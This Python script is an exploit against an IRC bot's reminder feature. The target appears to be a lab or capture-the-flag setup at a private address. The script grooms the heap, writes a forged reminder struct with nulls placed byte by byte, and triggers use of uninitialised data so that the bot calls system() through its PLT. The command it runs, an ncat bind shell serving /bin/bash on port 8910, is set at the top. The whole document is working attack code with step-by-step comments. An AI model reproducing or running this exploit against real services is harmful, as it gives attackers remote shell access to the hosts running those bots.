#! /usr/bin/python3
from socket import *
import time
import codecs
import random
import selectors
import sys
import struct

revshell = b'ncat -e /bin/bash -l 8910; #'
HOST = "172.16.1.100"
PORT = 6667
CHAN = b"#exploit"
KEYSTR = b":Okay! id "
REMINDERSZ = 0x38 - 1 - 1 # 0x38, with leading space and ending null
SYSTEMPLT = 0x402150
GHELLO = 0x40e2a0

REMINDEROFF_USER = 0x20 - 1
REMINDEROFF_ACTION = 0x30 - 1

def connectAndJoin(s, username):
    s.sendall(b'USER '+ username +b' +i unused pwn_cli\r\n')
    s.sendall(b'NICK '+ username +b'\r\n')
    s.sendall(b'JOIN '+ CHAN +b'\r\n')
    print(s.recv(0x1000))

def msgChan(s, msg):
    msg = b'PRIVMSG '+ CHAN +b' :'+ msg +b'\r\n'
    s.sendall(msg)
    print(b'Sent: '+msg)
    time.sleep(0.2)

def getID(s):
    id = 0
    while True:
        resp = s.recv(0x1000)
        print(resp)
        i = resp.find(KEYSTR)
        if i != -1:
            i += len(KEYSTR)
            id = resp[i:].split()[0]
            break
    return id

def recvaction(obj):
    t = obj.recv(1024)
    if len(t) == 0:
        exit()
    print(t)

def interactive(s):
    print("GOING INTERACTIVE")
    s.setblocking(False)
    sel = selectors.DefaultSelector()
    sel.register(s, selectors.EVENT_READ, recvaction)
    inputaction = lambda obj: msgChan(s, codecs.encode(obj.readline(), 'ascii'))
    sel.register(sys.stdin, selectors.EVENT_READ, inputaction)

    while True:
        evts = sel.select()
        for key, mask in evts:
            key.data(key.fileobj)


def main():
    # make a connection to the server
    s = socket(AF_INET, SOCK_STREAM, 0);

    s.connect((HOST, PORT))
    username = b"pwnr_" + codecs.encode(str(random.randint(0,1000)), 'ascii')
    connectAndJoin(s, username)

    # if the server supports the BOT command, we can just create the bot ourselves
    botname = b'exploitable_' + codecs.encode(str(random.randint(0,1000)), 'ascii')
    # create the bot
    s.sendall(b'BOT bot5 ' + botname + b' ' + CHAN + b' :' + revshell + b'\r\n')
    #time.sleep(1)

    # otherwise assume it is up and set it's hello message
    msgChan(s, b"remindHi! " + revshell + b'\r\n')


    # groom the area
    # Having a few allocations there makes the exploit more reliable

    for i in range(2):
        msgChan(s, b"remindMe! 9999999 " + (b"D" * REMINDERSZ))
        getID(s)

    # We could get a peek by turning a type start turn into an alarm, with the address we want to read from in the user field.
    # The user field will be uninitalized data, so we can use the same method below to choose what address we want there.
    # We have it call the actual alarm action. This will have it output a "Alarm for " followed by printing out the contents of memory till it hits a null
    # We don't need the peek though, the binary is type EXEC, so the main image isn't ASLRd anyways. We can use the PLT entry to call system

    peeked = SYSTEMPLT

    # construct the packet we want to be the uninitialized data for our exploit
    # This will fill in the uninitaized fields of a struct _reminder
    # We will allocated a Start type reminder, which doesn't initialize the user or the action
    # The action will be the address of system in the plt
    # The user will be the arument to system
    # We will use the global hello text area, because we know where it is, and can control it when starting the bot with the BOT command

    packet = b""
    packet += b"E" * REMINDEROFF_USER
    packet += struct.pack("<Q", GHELLO)
    packet += b"E" * (REMINDEROFF_ACTION - len(packet))
    packet += struct.pack("<Q", peeked)

    packet = packet[:REMINDERSZ]

    # replace nulls for now
    print(packet)
    packet = packet.replace(b'\0', b'*')

    msgChan(s, b"remindMe! 9999999 " + packet)
    theid = getID(s)
    print(b"Id" + theid)

    # edit the nulls in
    # we go backwards, using the strcpy's end null to write the nulls in one at a time
    while True:
        i = packet.rfind(b"*")
        print(i)
        if i == -1:
            break
        packet = packet[:i] + b'\0' + packet[i+1:]

        msgChan(s, b"remindEdit! "+ theid + b" msg= "+packet)
        getID(s)

    # free the packet we crafted, so it can be reused
    msgChan(s, b"remindEdit! "+ theid + b" time= -1")
    getID(s)

    # pwn
    time.sleep(2.0)

    msgChan(s, b"remindStart!")
    getID(s)

    # This one gets placed where the freed packet was
    # kinda reliably? In a more complicated situation we would have to do better grooming
    msgChan(s, b"remindStart!")
    theid2 = getID(s)

    # Cause the use of the uninitalized data
    msgChan(s, b"remindEdit! "+ theid2 + b" type=alarm")
    getID(s)

    # now the system command should have run!
    print("Okay! Should have run \"", revshell, "\" as the bot!")

    # interactive if you still wanna chat in the chan or something
    interactive(s)

if __name__ == '__main__':
    main()
